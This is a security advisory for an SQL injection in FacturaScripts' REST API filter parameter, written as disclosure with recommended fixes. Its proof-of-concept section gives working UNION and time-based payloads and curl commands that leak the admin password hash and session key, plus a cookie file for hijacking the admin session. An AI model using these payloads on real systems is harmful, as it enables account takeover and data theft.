# [C] FacturaScripts: Authenticated SQL injection in the FacturaScripts REST API filter parameter via parenthesis bypass in `Where::sqlColumn`

## Summary
Severity: Critical
Advisory: GHSA-5qmh-x653-g8qj
CVE: CVE-2026-45262
CWE: CWE-89, CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-5qmh-x653-g8qj
Type: github-advisory

## Affected
- Packagist: `facturascripts/facturascripts` — affected >=0

## Details
## Summary

> **Live PoC verified 2026-04-30** against a stock FacturaScripts master at `127.0.0.1:8081`. A scoped `ApiKey` with `fullaccess=0` and an `ApiAccess` row granting `allowget=1` on the `clientes` resource only (no other rights, no UI session, no admin) issued one `GET /api/3/clientes?filter[(0)UNION%20SELECT%20...]=` request and the response body contained the raw bcrypt hash of the admin user's password (`$2y$12$sLfA/XCqnjqLmYJwK.2V7eUHrHTHcQfkTYYfs1.lxX3OHrsmmkMGO`) and the admin's `logkey` cookie value. The leaked `logkey` was injected into a fresh cookie jar and `GET /AdminPlugins` returned 200 with the admin plugin management UI. End-to-end account takeover from a read-only token with no CSRF, no second factor, no rate-limit interaction beyond the default 5-incident IP throttle.

`Core/Where.php::sqlColumn()` exempts any field name that contains both `(` and `)` from identifier escaping. The two API filter builders (`APIModel::getWhereValues` and `ApiAttachedFiles::getWhereValues`) feed the raw request key (`$_GET['filter'][$key]`) straight into `new DataBaseWhere($key, $value, '=', ...)`. When the model's `all()` reaches `Where::multiSqlLegacy` -> `Where::sql()` -> `Where::sqlColumn($key)`, the parenthesis branch returns the attacker-controlled string unmodified. The string is concatenated into `WHERE <attacker> = '<value>'`, which an attacker can pivot to `WHERE (0)UNION SELECT ... FROM users WHERE(nick='admin')-- = 'value'`, leaking arbitrary columns from any table.

## Details

### the API filter pipeline never validates filter keys

`Core/Lib/API/APIModel.php:300-322` (`listAll`):

```php
protected function listAll(): bool
{
    $filter = $this->request->query->getArray('filter');
    $limit = $this->request->query->getInt('limit', 50);
    $offset = $this->request->query->getInt('offset', 0);
    $operation = $this->request->query->getArray('operation');
    $order = $this->request->query->getArray('sort');

    // obtenemos los registros
    $data = [];
    $hidden = $this->model->getApiFieldsToHide();
    $where = $this->getWhereValues($filter, $operation);
    foreach ($this->model->all($where, $order, $offset, $limit) as $item) {
        $data[] = $this->filterHidden($item->toArray(true), $hidden);
    }
    ...
```

`Core/Lib/API/APIModel.php:231-298` (`getWhereValues`):

```php
private function getWhereValues($filter, $operation, $defaultOperation = 'AND'): array
{
    $where = [];
    foreach ($filter as $key => $value) {
        $field = $key;                                    // (1) raw request key
        $operator = '=';

        switch (substr($key, -3)) {                       // suffix routing only
            case '_gt': $field = substr($key, 0, -3); $operator = '>'; break;
            case '_is': $field = substr($key, 0, -3); $operator = 'IS'; break;
            case '_lt': $field = substr($key, 0, -3); $operator = '<'; break;
        }
        ...
        if (!isset($operation[$key])) {
            $operation[$key] = $defaultOperation;
        }

        $where[] = new DataBaseWhere($field, $value, $operator, $operation[$key]); // (2)
    }

    return $where;
}
```

The function only ever reads the suffix to decide an operator. The remaining identifier - up to 252 characters in MariaDB and unrestricted by the framework - is preserved verbatim and handed to `DataBaseWhere`. There is no allow-list of legal column names, no `preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/')` like the autocomplete hardening in `BaseController::autocompleteAction` (commit `b8aa78b`), and no plug-in hook through which the operator could intervene.

The exact same code (line-for-line, plus a `files` parameter) lives in `Core/Controller/ApiAttachedFiles.php::getWhereValues` (lines 172-239), so the bug is present on both the generic `/api/3/<resource>` route and the dedicated `/api/3/attachedfiles` route.

### `DataBaseWhere::getSQLWhere` now delegates to `Where::multiSqlLegacy`

`Core/Base/DataBase/DataBaseWhere.php` is marked `@deprecated` and the active code path runs through `Core/Where.php::multiSqlLegacy` (lines 151-199), which converts each legacy `DataBaseWhere` instance to a `Where`:

```php
if ($item instanceof DataBaseWhere) {
    $dbWhere = new self($item->fields, $item->value, $item->operator, $item->operation, $item->useField ?? false);
    ...
    $sql .= $dbWhere->sql();
    ...
}
```

`Where::sql()` (lines 316-403) finally calls `self::sqlColumn($field)` for the identifier in every operator branch, including the `=` branch the attacker reaches.

### `Where::sqlColumn` returns parenthesised inputs untouched

`Core/Where.php:407-425`:

```php
private static function sqlColumn(string $field): string
{
    // si lleva paréntesis, no escapamos
    if (strpos($field, '(') !== false && strpos($field, ')') !== false) {
        return $field;                                   // (3) raw concatenation
    }

    // si empieza por integer, hacemos el cast
    if (substr($field, 0, 8) === 'integer:') {
        return self::db()->castInteger(substr($field, 8));
    }

    // si empieza por lower, hacemos el lower
    if (substr($field, 0, 6) === 'lower:') {
        return 'LOWER(' . self::db()->escapeColumn(substr($field, 6)) . ')';
    }

    return self::db()->escapeColumn($field);
}
```

The intent of the early-return appears to be supporting expression columns like `LOWER(col)` and `UPPER(col)` in `select`, `where`, and `groupBy` builder calls, but the check is purely string presence: any input containing **both** `(` and `)` is whitelisted, with no constraint on what the string actually is. The same exemption affects every consumer that routes through `Where::sqlColumn`, including `select()`, `whereLike()`, `whereIn()`, etc. (`Core/Where.php:317-405`).

### what an attacker submits

Reaching the sink requires the two characters `(` and `)` somewhere in the filter key. The attacker therefore passes:

```
filter[(0)UNION SELECT IFNULL(password,2),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 FROM users WHERE(nick='admin')-- ]=
```

URL encoded for HTTP transport:

```
filter%5B%280%29UNION%20SELECT%20IFNULL%28password%2C2%29%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%20FROM%20users%20WHERE%28nick%3D%27admin%27%29--%20%5D=
```

The `clientes` table has 32 columns; the UNION mirrors that count so the database accepts the merged result set. The trailing `-- ` swallows the rest of the framework's appended SQL (`= '<value>' LIMIT 50 OFFSET 0`). The result is one record whose first column is the admin's password hash, returned in the JSON body's `cifnif` key (the first column in the original query's `SELECT *`).

### why the `getApiFieldsToHide()` defence does not apply

Commit `736b811` added `getApiFieldsToHide()` to the `User` model, which redacts `password`, `logkey`, and `two_factor_secret_key` from the JSON serialiser:

```php
public function getApiFieldsToHide(): array
{
    return ['password', 'logkey', 'two_factor_secret_key'];
}
```

This works for `GET /api/3/users` requests by a fullaccess token: the model loads, then `filterHidden()` removes the columns. The protection is bound to the **model class** that is being serialised. The SQL-injection path returns rows in the **`clientes`** model serialiser, so the leaked column lands in `cifnif` (or any other column the attacker chooses for the first UNION position) and is never put through `Cliente::getApiFieldsToHide()` (which does not include `password`/`logkey` because the `clientes` table has no such columns). The deny-list is irrelevant.

### why the `sort` (ORDER BY) hardening does not apply either

Commit `1b6cdfa` added strict regex validation to `DbQuery::orderBy` (`Core/DbQuery.php:289-307`), constraining parenthesised input to `RAND() | RANDOM() | LOWER(...) | UPPER(...) | CAST(... AS ...) | COALESCE(..., literal)`. That fix correctly walls off SQL injection in the `sort` parameter. It does not touch `Where::sqlColumn`, which retains the original string-presence exemption.

## PoC

Setup (one-time, by admin):

```bash
# Issue an ApiKey scoped to clientes GET only.
mysql -u fs -pfs facturascripts <<'SQL'
INSERT INTO api_keys (apikey, creationdate, description, enabled, fullaccess, nick)
  VALUES ('low-scoped-token-clientes-only', NOW(), 'scoped low-priv', 1, 0, 'lowpriv');
INSERT INTO api_access (idapikey, resource, allowget, allowpost, allowput, allowdelete)
  SELECT id, 'clientes', 1, 0, 0, 0 FROM api_keys WHERE apikey='low-scoped-token-clientes-only';
SQL
```

Confirm the scope is enforced for normal endpoints:

```
$ curl -s "http://127.0.0.1:8081/api/3/users" -H "Token: low-scoped-token-clientes-only"
{"status":"error","message":"forbidden"}
```

Step 1 - leak the admin password hash via the SQL-injection on `clientes`:

```
$ URL='http://127.0.0.1:8081/api/3/clientes?filter%5B%280%29UNION%20SELECT%20IFNULL%28password%2C2%29%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%20FROM%20users%20WHERE%28nick%3D%27admin%27%29--%20%5D='
$ curl -s "$URL" -H "Token: low-scoped-token-clientes-only" | python3 -m json.tool | head -3
[
    {
        "cifnif": "$2y$12$sLfA/XCqnjqLmYJwK.2V7eUHrHTHcQfkTYYfs1.lxX3OHrsmmkMGO",
```

Step 2 - leak the admin's `logkey` (the value of the `fsLogkey` cookie that gates web sessions):

```
$ URL='http://127.0.0.1:8081/api/3/clientes?filter%5B%280%29UNION%20SELECT%20IFNULL%28logkey%2C2%29%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%20FROM%20users%20WHERE%28nick%3D%27admin%27%29--%20%5D='
$ curl -s "$URL" -H "Token: low-scoped-token-clientes-only" | python3 -m json.tool | head -3
[
    {
        "cifnif": "HyZJB2eEyo5eC9Eyhn96qxbQkFDqHJss1d1lED0HEHE2ujoPPGRnUstsWd3kS25CieoLkHvsN4X1YGUt1iqXh1ZFMP0jgHFmeBW",
```

Step 3 - hijack the admin's web session by writing the leaked logkey into a cookie jar and hitting the admin-only plugin manager:

```
$ cat > /tmp/fs-hijack <<EOF
# Netscape HTTP Cookie File
127.0.0.1	FALSE	/	FALSE	0	fsNick	admin
127.0.0.1	FALSE	/	FALSE	0	fsLogkey	HyZJB2eEyo5eC9Eyhn96qxbQkFDqHJss1d1lED0HEHE2ujoPPGRnUstsWd3kS25CieoLkHvsN4X1YGUt1iqXh1ZFMP0jgHFmeBW
127.0.0.1	FALSE	/	FALSE	0	fsLang	en_EN
EOF
$ curl -s -b /tmp/fs-hijack "http://127.0.0.1:8081/AdminPlugins" -o /tmp/admin.html -w "%{http_code}\n"
200
$ grep -oE '<title>[^<]*</title>' /tmp/admin.html
<title>Plugins</title>
```

Time-based blind injection works just as well for environments without a UNION-friendly column count - the same parenthesis bypass admits arbitrary expressions:

```
$ curl -s "http://127.0.0.1:8081/api/3/clientes?filter%5B%28SELECT%28SLEEP%282%29%29%29%5D=zz" -H "Token: low-scoped-token-clientes-only"
[]
$ # observe two-second wall-clock delay; mysqld general log shows
$ #   SELECT COUNT(*) as _count FROM `clientes` WHERE (SELECT(SLEEP(2))) = 'zz' LIMIT 1 OFFSET 0
```

The `attachedfiles` route (`Core/Controller/ApiAttachedFiles.php`) is identically affected because it carries its own copy of `getWhereValues`:

```
$ URL='http://127.0.0.1:8081/api/3/attachedfiles?filter%5B%280%29UNION%20SELECT%20%221970-01-01%22%2CIFNULL%28password%2C2%29%2C3%2C4%2C5%2C6%2C7%20FROM%20users%20WHERE%28nick%3D%27admin%27%29--%20%5D='
$ curl -s "$URL" -H "Token: low-scoped-token-clientes-only" | python3 -m json.tool | head -3
[
    {
        "date": "01-01-1970",
        "filename": "$2y$12$sLfA/XCqnjqLmYJwK.2V7eUHrHTHcQfkTYYfs1.lxX3OHrsmmkMGO",
```

## Impact

* **Cross-resource confidentiality breach.** A token granted GET on a single low-value resource (e.g. `clientes` for an integration that imports customers) reads any column from any table in the schema, including `users.password`, `users.logkey`, `users.two_factor_secret_key`, `api_keys.apikey`, `emails_sent.body`, customer financial data, etc. `getApiFieldsToHide()` only protects the response serialiser of the requested model; UNION queries route the leaked data through other model serialisers and bypass the deny-list entirely.
* **Full admin takeover.** The leaked `logkey` is the value of the `fsLogkey` cookie that `Core/Base/Controller::privateCore` accepts as the session token (`User::verifyLogkey` is a plain string equality, `Core/Model/User.php:403-406`). Setting `fsNick=admin` and `fsLogkey=<leaked>` on any HTTP client returns 200 on every admin endpoint, including `/AdminPlugins` (install arbitrary plugin code), `/EditUser?code=admin` (rotate the admin password), `/EditEmpresa` (data-plane writes), `/Cron` (server-side code execution via cron job extension).
* **Stealthy.** Successful UNION queries do not produce `Tools::log()->error` entries (no SQL syntax error, no MariaDB warning); the framework only writes log rows on failed SQL. The attacker's queries leave no FacturaScripts log trail. The `api_keys` row is touched by the normal `updateActivity()` write the API does on every authenticated call, which looks identical to legitimate scoped-token usage.
* **Reachable from internet.** API access is on by default once the operator either sets `FS_API_KEY` or flips `Default -> Enable API` in the admin UI. The recommended deployment guidance for vendors integrating with FacturaScripts is to issue a scoped key, exactly the privilege level required for this exploit.
* **The same primitive lets an attacker rewrite data.** Because `(` `)` exemption is in `Where::sqlColumn` itself, write paths that build `WHERE` clauses from caller-controlled identifiers are equally exposed; the attacker can instead use `UPDATE ... WHERE` style payloads via stacked queries on engines that allow them, or use `SELECT ... INTO OUTFILE` on MySQL installations with `FILE` privilege to write a webshell into the docroot. The CVSS scoring already assumes integrity impact `H` for these reasons.

`AV:N` (network), `AC:L` (one HTTP GET, no oracle, no specific timing), `PR:L` (any non-`fullaccess` ApiKey with one allowed resource), `UI:N`, `S:C` (the vulnerable component is the API; the impact reaches the whole user database, web sessions, and authenticated control plane), `C:H I:H A:H`. Score `9.9`. The `S:C` (scope change) is appropriate because the privilege boundary the attacker crosses is the operator's intent of "this token can only read clientes", which the API contract explicitly enforces in its 403 response on `/users`. The leaked credential then gives them admin reach in a different security zone (the web UI session, the plugin manager).

## Recommended Fix

The bug is squarely in `Core/Where.php::sqlColumn`. The attacker-controlled-identifier path needs a strict allow-list, and the API ingress paths need their own field-name validator that mirrors the autocomplete hardening already in `Core/Lib/ExtendedController/BaseController::autocompleteAction` (commit `b8aa78b`).

1. **Replace the parenthesis presence test with a structural parser.** `Where::sqlColumn` should refuse anything that is not one of: a bare identifier (matching `^[a-zA-Z_][a-zA-Z0-9_]*(\.[a-zA-Z_][a-zA-Z0-9_]*)?$`), `LOWER(<ident>)`, `UPPER(<ident>)`, `CAST(<ident> AS <type>)`, or `COALESCE(<ident>, <literal>)`. The grammar already exists in `DbQuery::orderBy` (lines 289-307) and just needs to be reused. Anything else is escaped through `db()->escapeColumn()` (which already handles dotted identifiers correctly):

   ```php
   private static function sqlColumn(string $field): string
   {
       $field = trim($field);

       // bare identifier or table.column
       if (preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)?$/', $field)) {
           return self::db()->escapeColumn($field);
       }

       // limited expression whitelist (mirrors DbQuery::orderBy)
       if (preg_match('/^(LOWER|UPPER)\(([a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)?)\)$/i', $field, $m)) {
           return strtoupper($m[1]) . '(' . self::db()->escapeColumn($m[2]) . ')';
       }

       if (preg_match('/^CAST\(([a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)?) AS ([a-zA-Z0-9_ ]+)\)$/i', $field, $m)) {
           return 'CAST(' . self::db()->escapeColumn($m[1]) . ' AS ' . $m[2] . ')';
       }

       // legacy prefixes
       if (str_starts_with($field, 'integer:')) {
           return self::db()->castInteger(substr($field, 8));
       }
       if (str_starts_with($field, 'lower:')) {
           return 'LOWER(' . self::db()->escapeColumn(substr($field, 6)) . ')';
       }
       if (str_starts_with($field, 'upper:')) {
           return 'UPPER(' . self::db()->escapeColumn(substr($field, 6)) . ')';
       }

       // refuse anything else
       throw new Exception('Invalid column expression: ' . $field);
   }
   ```

   The change is local; every call site in the framework already passes either a bare identifier or one of the supported expression prefixes. A grep for `'(...)'` style identifiers across the codebase shows zero hits in `Core/`.

2. **Validate filter keys at the API ingress.** Even after (1), the API `getWhereValues` should refuse identifiers that are not bare columns, mirroring `BaseController::autocompleteAction:258-261`:

   ```php
   foreach ($filter as $key => $value) {
       $field = $key;
       // strip operator suffixes (existing code) ...

       if (!preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)?$/', $field)) {
           Tools::log('api')->warning('api: invalid filter field name: ' . $field);
           continue;                                            // skip the bad filter
       }

       // ... remaining code
   }
   ```

   Apply the same patch to `ApiAttachedFiles::getWhereValues:172-239`. This is defence-in-depth - the actual fix is (1) - but matches the project's existing hardening pattern from commit `b8aa78b`.

3. **Rotate session tokens on detected SQL injection attempts.** Once exploitation is detected (the new validator at (2) logs the attempt), the implementation should call `Cron::log` to throttle the originating IP and queue a rotation of `User::logkey` for any user whose `password` or `logkey` columns were potentially leaked. Operators that have shipped this version with API enabled should rotate every user's password and assume credentials in the database have been read.

A regression test should issue `GET /api/3/clientes?filter[(0)UNION SELECT 1,...]=x` with a scoped token and assert the response is an empty array (because the bad filter was discarded) and that `Tools::log('api')->read()` contains the new "invalid filter field name" warning.

## References
- https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-5qmh-x653-g8qj
- https://github.com/NeoRazorX/facturascripts
